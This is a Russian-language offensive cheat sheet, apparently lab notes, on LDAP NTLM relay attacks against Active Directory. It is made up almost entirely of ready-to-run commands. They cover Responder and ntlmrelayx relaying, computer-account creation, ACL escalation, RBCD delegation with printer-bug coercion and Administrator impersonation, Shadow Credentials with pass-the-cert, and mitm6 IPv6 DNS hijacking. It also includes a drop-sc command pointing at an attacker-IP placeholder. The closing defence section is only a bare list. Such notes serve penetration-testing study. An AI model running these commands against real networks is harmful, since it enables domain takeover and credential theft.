#ldap #relay #mitm #ad #hacking #ntlm

> **LDAP Relay** — разновидность [[NTLM Relay]], где атакующий перехватывает запрос аутентификации и перенаправляет его на Контроллер Домена (DC) по протоколу LDAP/LDAPS. В отличие от SMB Relay, цель здесь — не захват отдельной машины, а **модификация объектов базы данных Active Directory**.

Мы перенаправляем LDAP аутентификацию на DC, так как там вероятнее всего находится LDAP сервер

Мы можем провести несколько различных атак:
1) Перечисление Домена
2) ACL Abuze
3) Создание УЗ компьютера

Для отключения возможностей добавления Domain Admin и Abuze ACL используются флаги: `--no-acl` и `--no-da`
# 1) Domain enum ( --lootdir/-l )

1) Отключение сервера на Respondere, Чтобы освободить его для ntlmrelayx
```bash
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
```

2) Включаем
```bash
sudo python3 Responder/Responder.py -I ens192
```

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump
```

На этом этапе может появиться сообщение об ошибке
`The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)`
Так как SMB требует подписи, чтобы ее обойти мы можем попробовать воспользоваться 2мя эксплойтами:
-`--remove-mic` - `Drop the MIC CVE-2019-1040`
-`-remove-target` - `Your Session Key is my Session Key` (`CVE-2019-1019`)

Это может не сработать, поэтому ждем HTTP аутентификации, там signing не обязательна, поэтому ждем ее

# 2) Создание УЗ компьютера

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'NAME$' 'PASS'
```

```bash
sudo python3 Responder/Responder.py -I ens192
```

при необходимости использовать LDAPS ntlmrelayx сам обходит `LDAP channel binding` при помощи [StartTLS](https://offsec.almond.consulting/bypassing-ldap-channel-binding-with-starttls.html) , однако на DC должна быть отключена `LDAP signing`


# 3) ACL Abuze

> Мы можем провести эту атаку в случае, если ретранслируемый юзер будет высокопривелигированным

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
```
 Мы должны эскалировать юзера или УЗ компьютера, ту, которую мы контролируем (например, созданную на предыдущем шаге)


# 4) Kerberos RBCD Abuse

При кросс протокольном релее мы можем передать NTLM аутентификацию по LDAP и изменить значения атрибута `msDS-AllowedToActOnBehalfOfOtherIdentit`, чтобы добавить нашу подконтрольную УЗ в список для делегирования

> Проводить желательно через HTTP аутентификацию,  то есть должна быть включена служба WebDAV, так как SMB обычно с signing

То есть HTTP -> LDAP(S)

![[Set attribute to delegation.png]]

1) Перечисляем хосты на работу службы WebDAV
```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://<ATTACKER_IP>/testing FILENAME=@secret
```

2) Инициируем включение службы WebDAV
```bash
nxc smb 172.16.117.0/24 -u 'MY$' -p 'MY'  -M webdav
```

3) Респондер
```bash
sudo python3 Responder.py -I ens192
```

4) ntlmrelayx с устанавливанием прав на делегирование 
```bash
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'MY$' --no-smb-server --no-dump
```

5) coercion auth
```bash
python3 printerbug.py 'inlanefreight'/'MY$':'MY'@172.16.117.60 LINUX01@80/print
```

5) Выпуск билета и имперсонификация для целевой службы 
```bash
getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"MY$":"MY"
```

5) Подключение к службе
```bash
KRB5CCNAME=Administrator.ccache 

psexec.py -k -no-pass sql01.inlanefreight.local
```

# 5) Shadow Credential

Эта техника используется для записи дополнительных учетных данных в УЗ без изменения уже имеющихся
Использует атрибут `msDS-KeyCredentialLink`
Может работать только на DC **Windows Server 2016**

> У атакующего должен быть доступ на запись к атрибуту `msDS-KeyCredentialLink` целевого объекта (например, через `GenericWrite` или делегирование прав)

1) Респондер
```bash
sudo python3 Responder.py -I ens192
```

2) Настройка ntlmrelayx `CJAQ` имеет права над `jperez`, для установления атрибута
```bash
ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl --no-smb-server
```
После аутентификации получаем готовый .pfx Сертификат и пароль от него

3) Используем технику Pass-the-Cert 
```bash
python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z INLANEFREIGHT.LOCAL/jperez jperez.ccache
```

4) Подключение к службе
```bash
KRB5CCNAME=jperez.ccache 

evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL
```


---

## Сценарий эксплуатации через IPv6

#### Шаг 1: Подготовка (Захват DNS через IPv6)

В сетях с настроенным SMB Signing эффективнее всего использовать `mitm6`, так как он создает "авторитетный" DNS-канал и форсирует аутентификацию по LDAPS.

```bash
sudo mitm6 -d internal.domain.local
```

#### Шаг 2: Запуск релея (ntlmrelayx)

Запускаем релей, нацеленный на Контроллер Домена. Нам нужно использовать флаг `-6` (для IPv6) и выбрать метод воздействия на AD.

**Вариант А: Повышение прав (Privilege Escalation)** Если мы перехватим сессию пользователя с правами (например, Admin), мы можем делегировать права нашему пользователю.

```bash
impacket-ntlmrelayx -t ldap://10.10.10.1 -6 --escalate-user scaletta
```

**Вариант Б: Создание нового компьютера (MachineAccountQuota)** По умолчанию любой пользователь в AD может добавить до 10 компьютеров в домен. Мы используем это, чтобы получить аккаунт с паролем.

```bash
impacket-ntlmrelayx -t ldaps://10.10.10.1 -6 --add-computer NEW_PC
```

#### Шаг 3: Эксплуатация полученных прав через DCSync

### Инструменты

- **mitm6:** Для первичного перехвата трафика через DHCPv6/DNS.
- **[[Impacket]] (ntlmrelayx):** Основной движок для взаимодействия с LDAP.
- **PetitPotam:** Coerce-примитивы для принуждения сервера к аутентификации.

### Защита

1. **LDAP Signing:**
2. **LDAP Channel Binding
3. **Disable IPv6**
4. **Protected Users Group**
